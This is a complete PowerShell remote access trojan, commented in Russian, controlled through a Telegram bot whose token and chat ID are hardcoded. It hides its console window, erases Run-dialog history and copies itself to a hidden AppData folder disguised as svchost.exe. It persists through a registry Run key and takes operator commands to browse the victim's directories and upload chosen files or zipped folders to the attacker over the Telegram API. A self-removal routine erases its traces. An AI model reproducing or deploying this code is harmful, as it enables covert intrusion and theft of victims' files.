# RAT через Telegram Bot - С ИСПРАВЛЕННЫМ СКРЫТИЕМ ОКНА
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# ПРЯМОЕ СКРЫТИЕ ОКНА POWERSHELL ДЛЯ WINDOWS 10/11
try {
    # Метод 1: Через WinAPI
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    public class WindowHider {
        [DllImport("user32.dll")] 
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        [DllImport("kernel32.dll")] 
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
    }
"@
    Add-Type -TypeDefinition $code
    $consolePtr = [WindowHider]::GetConsoleWindow()
    [WindowHider]::ShowWindow($consolePtr, 0) | Out-Null
} catch { }

try {
    # Метод 2: Через WScript.Shell для гарантированного скрытия
    $wshell = New-Object -ComObject WScript.Shell
    $wshell.SendKeys("%{TAB}") | Out-Null
} catch { }

# Метод 3: Скрытие через процесс
$currentProcess = Get-Process -Id $pid
try {
    $currentProcess.MainWindowHandle | Out-Null
    if ($currentProcess.MainWindowHandle -ne [IntPtr]::Zero) {
        Add-Type -Name Window -Namespace Console -MemberDefinition @"
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
"@
        $consolePtr = [Console.Window]::GetConsoleWindow()
        [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
    }
} catch { }

# Очистка истории RUN при запуске
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# Функция очистки RAT
function Invoke-Cleanup {
    Send-Telegram "🔍 Начинается полная очистка RAT..."

    # 1. Завершаем все процессы RAT
    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"

    $processes = Get-Process | Where-Object {
        $_.ProcessName -eq "powershell" -or 
        $_.ProcessName -eq "pwsh" -or
        $_.ProcessName -eq "cmd"
    }

    foreach ($process in $processes) {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*8429674512*") {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    # 2. Удаляем файлы RAT
    Send-Telegram "🔄 Этап 2: Удаление файлов RAT"

    $filesToDelete = @(
        "$env:APPDATA\Microsoft\Windows\System32Logs\svchost.exe",
        "$env:TEMP\windows_update.marker"
    )

    $deletedFiles = @()
    foreach ($file in $filesToDelete) {
        try {
            if (Test-Path $file) {
                Remove-Item $file -Force -ErrorAction SilentlyContinue
                $deletedFiles += $file
            }
        } catch { }
    }

    # 3. Очищаем автозагрузку реестра
    Send-Telegram "🔄 Этап 3: Очистка реестра"

    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            $value = Get-ItemProperty -Path $regPath -Name "System32 Logs Service" -ErrorAction SilentlyContinue
            if ($value) {
                Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\System32 Logs Service"
            }
        } catch { }
    }

    # 4. Очищаем историю RUN
    Send-Telegram "🔄 Этап 4: Очистка истории RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    # 5. Финальный отчет
    $report = @"
✅ ОЧИСТКА RAT ЗАВЕРШЕНА

Удаленные файлы:
$($deletedFiles -join "`n")

Удаленные записи реестра:
$($regEntries -join "`n")

Все следы RAT успешно удалены.
"@

    Send-Telegram $report
    return $true
}

# Установка в автозагрузку - УПРОЩЕННАЯ ВЕРСИЯ
$installMarker = "$env:TEMP\windows_update.marker"

# Проверяем, не установлен ли уже RAT
if (!(Test-Path $installMarker)) {
    # Создаем маркер установки
    "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
    
    # Создаем скрытую папку в AppData
    $hiddenFolder = "$env:APPDATA\Microsoft\Windows\System32Logs"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    $scriptPath = "$hiddenFolder\svchost.exe"
    
    # Сохраняем текущий скрипт в скрытое место
    try {
        # Получаем содержимое текущего скрипта
        $currentScript = Get-Content -LiteralPath $MyInvocation.MyCommand.Path -Raw -ErrorAction SilentlyContinue
        if ($null -eq $currentScript) {
            $currentScript = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
        }
        if ($null -ne $currentScript) {
            $currentScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
        }
    } catch {
        # Если не удалось, используем базовую версию
        $basicScript = @'
# Базовый RAT
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"
'@
        $basicScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
    }
    
    # Установка в автозагрузку
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) { 
        New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null 
    }
    
    Set-ItemProperty -Path $regPath -Name "System32 Logs Service" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# Очистка истории сообщений при запуске
try {
    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/destroy - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/destroy - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            
                            try {
                                # Запускаем встроенную функцию очистки
                                $cleanupResult = Invoke-Cleanup
                                
                                if ($cleanupResult) {
                                    Start-Sleep -Seconds 2
                                    Stop-Process -Id $pid -Force
                                }
                                
                            } catch {
                                Send-Telegram "❌ Ошибка при самоуничтожении"
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch { }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
